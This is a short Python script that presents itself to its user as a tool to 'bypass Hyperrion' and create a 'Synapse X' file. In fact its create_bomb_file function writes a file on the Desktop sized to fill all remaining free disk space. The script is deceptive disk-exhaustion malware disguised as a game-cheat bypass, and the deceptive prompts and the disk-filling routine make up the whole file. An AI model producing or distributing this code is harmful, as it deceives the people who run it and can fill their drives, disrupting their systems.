import os
import shutil

def create_bomb_file():
    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")

    file_name = "Synapse X"
    file_path = os.path.join(desktop_path, file_name)

    free_space = shutil.disk_usage(desktop_path).free

    print(f"Do u want to bypass: Hyperrion '{file_name}' will creating!")
    confirmation = input("Enter YES to bypassing: ")

    if confirmation != 'YES':
        print("Cancel bypassing.")
        return

    try:
        with open(file_path, "wb") as f:
            f.seek(free_space - 1)
            f.write(b'\0')

        print(f"Bypassing file '{file_name}' Created: {free_space / (1024 ** 2):.2f} MB")
    except Exception as e:
        print(f"Something wrong: {e}")

if __name__ == "__main__":
    create_bomb_file()
